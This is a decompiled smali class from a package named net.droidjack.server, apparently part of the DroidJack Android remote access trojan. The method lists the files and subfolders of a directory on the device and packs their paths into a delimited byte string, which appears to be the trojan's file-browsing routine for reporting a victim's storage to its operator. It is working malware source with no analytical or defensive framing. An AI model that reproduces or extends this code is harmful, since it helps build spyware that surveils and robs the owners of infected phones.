.class Lnet/droidjack/server/an;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/util/concurrent/Callable;


# instance fields
.field final synthetic a:Lnet/droidjack/server/am;

.field private final synthetic b:Ljava/lang/String;


# direct methods
.method constructor <init>(Lnet/droidjack/server/am;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/an;->a:Lnet/droidjack/server/am;

    iput-object p2, p0, Lnet/droidjack/server/an;->b:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a()[B
    .locals 7

    const/4 v0, 0x0

    :try_start_0
    iget-object v1, p0, Lnet/droidjack/server/an;->b:Ljava/lang/String;

    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lnet/droidjack/server/an;->a:Lnet/droidjack/server/am;

    invoke-virtual {v2}, Ljava/io/File;->getParent()Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v3}, Lnet/droidjack/server/am;->a(Lnet/droidjack/server/am;Ljava/lang/String;)V

    new-instance v1, Lnet/droidjack/server/ao;

    invoke-direct {v1, p0}, Lnet/droidjack/server/ao;-><init>(Lnet/droidjack/server/an;)V

    invoke-virtual {v2, v1}, Ljava/io/File;->listFiles(Ljava/io/FileFilter;)[Ljava/io/File;

    move-result-object v3

    new-instance v1, Lnet/droidjack/server/ap;

    invoke-direct {v1, p0}, Lnet/droidjack/server/ap;-><init>(Lnet/droidjack/server/an;)V

    invoke-virtual {v2, v1}, Ljava/io/File;->listFiles(Ljava/io/FileFilter;)[Ljava/io/File;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v2

    :try_start_1
    iget-object v1, p0, Lnet/droidjack/server/an;->a:Lnet/droidjack/server/am;

    array-length v4, v2

    new-array v4, v4, [Ljava/lang/String;

    invoke-static {v1, v4}, Lnet/droidjack/server/am;->a(Lnet/droidjack/server/am;[Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/NullPointerException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :goto_0
    :try_start_2
    iget-object v1, p0, Lnet/droidjack/server/an;->a:Lnet/droidjack/server/am;

    array-length v4, v3

    new-array v4, v4, [Ljava/lang/String;

    invoke-static {v1, v4}, Lnet/droidjack/server/am;->b(Lnet/droidjack/server/am;[Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/NullPointerException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :goto_1
    move v1, v0

    :goto_2
    :try_start_3
    iget-object v4, p0, Lnet/droidjack/server/an;->a:Lnet/droidjack/server/am;

    invoke-static {v4}, Lnet/droidjack/server/am;->a(Lnet/droidjack/server/am;)[Ljava/lang/String;

    move-result-object v4

    array-length v4, v4

    if-lt v1, v4, :cond_0

    move v1, v0

    :goto_3
    iget-object v3, p0, Lnet/droidjack/server/an;->a:Lnet/droidjack/server/am;

    invoke-static {v3}, Lnet/droidjack/server/am;->b(Lnet/droidjack/server/am;)[Ljava/lang/String;

    move-result-object v3

    array-length v3, v3

    if-lt v1, v3, :cond_1

    new-instance v2, Ljava/lang/StringBuffer;

    invoke-direct {v2}, Ljava/lang/StringBuffer;-><init>()V

    iget-object v1, p0, Lnet/droidjack/server/an;->a:Lnet/droidjack/server/am;

    invoke-static {v1}, Lnet/droidjack/server/am;->b(Lnet/droidjack/server/am;)[Ljava/lang/String;

    move-result-object v3

    array-length v4, v3

    move v1, v0

    :goto_4
    if-lt v1, v4, :cond_2

    iget-object v1, p0, Lnet/droidjack/server/an;->a:Lnet/droidjack/server/am;

    invoke-static {v1}, Lnet/droidjack/server/am;->a(Lnet/droidjack/server/am;)[Ljava/lang/String;

    move-result-object v1

    array-length v3, v1

    :goto_5
    if-lt v0, v3, :cond_3

    iget-object v0, p0, Lnet/droidjack/server/an;->a:Lnet/droidjack/server/am;

    invoke-static {v0}, Lnet/droidjack/server/am;->c(Lnet/droidjack/server/am;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    invoke-virtual {v2}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "UTF-8"

    invoke-virtual {v0, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    :goto_6
    return-object v0

    :catch_0
    move-exception v1

    iget-object v1, p0, Lnet/droidjack/server/an;->a:Lnet/droidjack/server/am;

    const/4 v4, 0x0

    new-array v4, v4, [Ljava/lang/String;

    invoke-static {v1, v4}, Lnet/droidjack/server/am;->a(Lnet/droidjack/server/am;[Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_0

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_6

    :catch_2
    move-exception v1

    :try_start_4
    iget-object v1, p0, Lnet/droidjack/server/an;->a:Lnet/droidjack/server/am;

    const/4 v4, 0x0

    new-array v4, v4, [Ljava/lang/String;

    invoke-static {v1, v4}, Lnet/droidjack/server/am;->b(Lnet/droidjack/server/am;[Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_1

    :cond_0
    :try_start_5
    iget-object v4, p0, Lnet/droidjack/server/an;->a:Lnet/droidjack/server/am;

    invoke-static {v4}, Lnet/droidjack/server/am;->a(Lnet/droidjack/server/am;)[Ljava/lang/String;

    move-result-object v4

    aget-object v5, v3, v1

    invoke-virtual {v5}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v1
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    :goto_7
    add-int/lit8 v1, v1, 0x1

    goto :goto_2

    :catch_3
    move-exception v4

    :try_start_6
    iget-object v4, p0, Lnet/droidjack/server/an;->a:Lnet/droidjack/server/am;

    invoke-static {v4}, Lnet/droidjack/server/am;->a(Lnet/droidjack/server/am;)[Ljava/lang/String;

    move-result-object v4

    const-string v5, ""

    aput-object v5, v4, v1
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto :goto_7

    :cond_1
    :try_start_7
    iget-object v3, p0, Lnet/droidjack/server/an;->a:Lnet/droidjack/server/am;

    invoke-static {v3}, Lnet/droidjack/server/am;->b(Lnet/droidjack/server/am;)[Ljava/lang/String;

    move-result-object v3

    aget-object v4, v2, v1

    invoke-virtual {v4}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v1
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    :goto_8
    add-int/lit8 v1, v1, 0x1

    goto/16 :goto_3

    :catch_4
    move-exception v3

    :try_start_8
    iget-object v3, p0, Lnet/droidjack/server/an;->a:Lnet/droidjack/server/am;

    invoke-static {v3}, Lnet/droidjack/server/am;->b(Lnet/droidjack/server/am;)[Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    aput-object v4, v3, v1

    goto :goto_8

    :cond_2
    aget-object v5, v3, v1

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v6, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "!"

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    add-int/lit8 v1, v1, 0x1

    goto/16 :goto_4

    :cond_3
    aget-object v4, v1, v0

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v5, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "@"

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_1

    add-int/lit8 v0, v0, 0x1

    goto/16 :goto_5
.end method

.method public synthetic call()Ljava/lang/Object;
    .locals 1

    invoke-virtual {p0}, Lnet/droidjack/server/an;->a()[B

    move-result-object v0

    return-object v0
.end method
